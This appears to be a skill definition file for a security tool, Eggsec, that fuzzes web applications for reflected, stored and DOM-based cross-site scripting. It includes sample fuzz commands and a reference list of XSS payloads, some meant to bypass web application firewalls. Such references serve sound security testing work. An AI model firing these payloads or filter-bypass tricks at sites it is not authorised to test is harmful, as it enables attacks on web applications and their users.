---
name: cross_site_scripting
description: "Cross-Site Scripting (XSS) vulnerability detection across web applications"
triggers:
  - xss
  - cross site scripting
  - javascript
  - js injection
  - script injection
  - reflected
  - stored
  - dom
  - alert
  - html injection
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: targets
---

## Overview

XSS testing finds vulnerabilities where attacker-controlled data is reflected in web pages without proper encoding. Eggsec tests for reflected, stored, and DOM-based XSS.

## Capabilities

- Reflected XSS detection
- Stored XSS detection
- DOM-based XSS testing
- Parameter fuzzing
- Header XSS testing
- Cookie injection
- HTML injection testing
- JavaScript context detection
- WAF bypass payloads
- Context-aware payload encoding

## Usage

### Basic XSS Test

```bash
eggsec fuzz --target https://example.com/search?q=test --type xss
```

### Test Multiple Parameters

```bash
eggsec fuzz --target https://example.com/ --type xss --all-params
```

### Stored XSS (Form Fields)

```bash
eggsec fuzz --target https://example.com/comment --type xss --method post
```

### DOM XSS Testing

```bash
eggsec fuzz --target https://example.com/#test --type xss --dom
```

## Payloads Reference

**Basic:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

**Event Handlers:**
```html
<img src=x onerror=alert(1)>
<iframe src=x onload=alert(1)>
<div onmouseover=alert(1)>
<input onfocus=alert(1) autofocus>
```

**WAF Bypass:**
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
<svg><script>alert(1)</script>
<img src="x" onerror="alert(1)">
<svg/onload=alert(1)>
```

**Polygot (multi-context):**
```javascript
javascript:alert(1)//<svg onload=alert(1)>//'
```

## Triggers

Keywords: xss, cross site scripting, javascript, script, alert, reflected, stored, dom, injection, payload, fuzz, test, html injection, event handler, onclick, onerror

## Best Practices

1. Always detect context (HTML, attribute, JS, URL) before testing
2. Use encoded payloads for filter bypass
3. Test both GET and POST parameters
4. Check HTTP headers (User-Agent, Referer)
5. Use DOM XSS testing for Single Page Applications (SPAs)